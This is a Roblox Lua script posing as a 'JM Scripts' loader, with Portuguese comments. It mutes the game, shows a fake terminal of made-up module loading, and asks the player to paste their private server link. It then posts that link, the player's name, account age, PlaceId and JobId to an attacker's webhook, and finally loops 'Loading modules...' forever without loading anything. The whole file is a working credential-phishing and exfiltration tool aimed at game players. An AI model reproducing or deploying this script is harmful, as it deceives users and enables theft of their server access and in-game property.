-- JM SCRIPTS LOADER

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")

local player = Players.LocalPlayer

local DISCORD = "https://discord.gg/ZPz8Renfz"
local WEBHOOK = "COLE_SUA_WEBHOOK_AQUI"

-- SILENCIAR SOM DO JOGO
for _,s in pairs(SoundService:GetDescendants()) do
	if s:IsA("Sound") then
		s.Volume = 0
	end
end

-- MUSICA CALMA
local music = Instance.new("Sound")
music.SoundId = "rbxassetid://1843529632"
music.Volume = 0.7
music.Looped = true
music.Parent = workspace
music:Play()

-- GUI
local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false
gui.Parent = player.PlayerGui

local main = Instance.new("Frame")
main.Size = UDim2.new(1,0,1,0)
main.BackgroundColor3 = Color3.fromRGB(0,0,0)
main.Parent = gui

-- BORDA ANIMADA
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(170,0,255)
stroke.Thickness = 3
stroke.Parent = main

spawn(function()
	while true do
		TweenService:Create(stroke,TweenInfo.new(2),{Transparency=0.2}):Play()
		wait(2)
		TweenService:Create(stroke,TweenInfo.new(2),{Transparency=0.6}):Play()
		wait(2)
	end
end)

-- TERMINAL FAKE
local terminal = Instance.new("TextLabel")
terminal.Size = UDim2.new(1,-20,1,-20)
terminal.Position = UDim2.new(0,10,0,10)
terminal.BackgroundTransparency = 1
terminal.Font = Enum.Font.Code
terminal.TextSize = 14
terminal.TextColor3 = Color3.fromRGB(0,255,0)
terminal.TextXAlignment = Enum.TextXAlignment.Left
terminal.TextYAlignment = Enum.TextYAlignment.Top
terminal.Text = ""
terminal.Parent = main

local modules = {"core","ui","loader","network","crypto","auth","engine"}

spawn(function()
	for i=1,80 do
		terminal.Text = terminal.Text.."\nLoading "..modules[math.random(1,#modules)].."_"..math.random(1000,9999)..".lua"
		wait(0.04)
	end
	
	wait(2)
	terminal:Destroy()
end)

-- PARTICULAS
local particleHolder = Instance.new("Frame")
particleHolder.Size = UDim2.new(1,0,1,0)
particleHolder.BackgroundTransparency = 1
particleHolder.Parent = main

local function spark()
	local p = Instance.new("Frame")
	p.Size = UDim2.new(0,3,0,3)
	p.BorderSizePixel = 0
	p.BackgroundColor3 = Color3.new(1,1,1)
	p.Position = UDim2.new(math.random(),0,1,0)
	p.Parent = particleHolder
	
	TweenService:Create(p,TweenInfo.new(4),{
		Position = UDim2.new(p.Position.X.Scale,0,-0.1,0),
		Transparency = 1
	}):Play()
	
	game.Debris:AddItem(p,4)
end

spawn(function()
	while true do
		spark()
		wait(0.1)
	end
end)

-- PAINEL PLAYER
local playerBox = Instance.new("Frame")
playerBox.Size = UDim2.new(0,280,0,80)
playerBox.Position = UDim2.new(0,20,1,-100)
playerBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
playerBox.Parent = main

local pbStroke = Instance.new("UIStroke")
pbStroke.Color = Color3.fromRGB(170,0,255)
pbStroke.Parent = playerBox

local info = Instance.new("TextLabel")
info.BackgroundTransparency = 1
info.Size = UDim2.new(1,-10,1,-10)
info.Position = UDim2.new(0,5,0,5)
info.Font = Enum.Font.Gotham
info.TextColor3 = Color3.new(1,1,1)
info.TextSize = 16
info.TextXAlignment = Enum.TextXAlignment.Left
info.TextYAlignment = Enum.TextYAlignment.Top
info.Text = "Player: "..player.Name.."\nAccount Age: "..player.AccountAge.." days"
info.Parent = playerBox

-- INPUT SERVER
local serverBox = Instance.new("TextBox")
serverBox.Size = UDim2.new(0,420,0,50)
serverBox.Position = UDim2.new(0.5,-210,0.6,0)
serverBox.PlaceholderText = "Cole o link do servidor privado"
serverBox.Text = ""
serverBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
serverBox.TextColor3 = Color3.new(1,1,1)
serverBox.Parent = main

local sbStroke = Instance.new("UIStroke")
sbStroke.Color = Color3.fromRGB(170,0,255)
sbStroke.Parent = serverBox

-- BOTAO DISCORD
local discord = Instance.new("TextButton")
discord.Size = UDim2.new(0,200,0,50)
discord.Position = UDim2.new(0.5,-100,0.72,0)
discord.Text = "Entrar no Discord"
discord.BackgroundColor3 = Color3.fromRGB(25,25,25)
discord.TextColor3 = Color3.new(1,1,1)
discord.Parent = main

local dStroke = Instance.new("UIStroke")
dStroke.Color = Color3.fromRGB(170,0,255)
dStroke.Parent = discord

discord.MouseButton1Click:Connect(function()
	setclipboard(DISCORD)
	discord.Text = "Link copiado!"
end)

-- FINAL + WEBHOOK
serverBox.FocusLost:Connect(function()

	local data = {
		content =
		"Player: "..player.Name..
		"\nAccountAge: "..player.AccountAge..
		"\nPrivateServer: "..serverBox.Text..
		"\nPlaceId: "..game.PlaceId..
		"\nServerId: "..game.JobId
	}

	pcall(function()
		request({
			Url = WEBHOOK,
			Method = "POST",
			Headers = {["Content-Type"]="application/json"},
			Body = HttpService:JSONEncode(data)
		})
	end)

	local thanks = Instance.new("TextLabel")
	thanks.Size = UDim2.new(1,0,0,120)
	thanks.Position = UDim2.new(0,0,0.35,0)
	thanks.BackgroundTransparency = 1
	thanks.Text = "Obrigado por usar nosso script\nNós somos muito gratos!"
	thanks.Font = Enum.Font.GothamBold
	thanks.TextSize = 32
	thanks.TextColor3 = Color3.new(1,1,1)
	thanks.Parent = main

	wait(5)

	while true do
		thanks.Text = "Loading modules."
		wait(0.5)
		thanks.Text = "Loading modules.."
		wait(0.5)
		thanks.Text = "Loading modules..."
		wait(0.5)
	end

end)
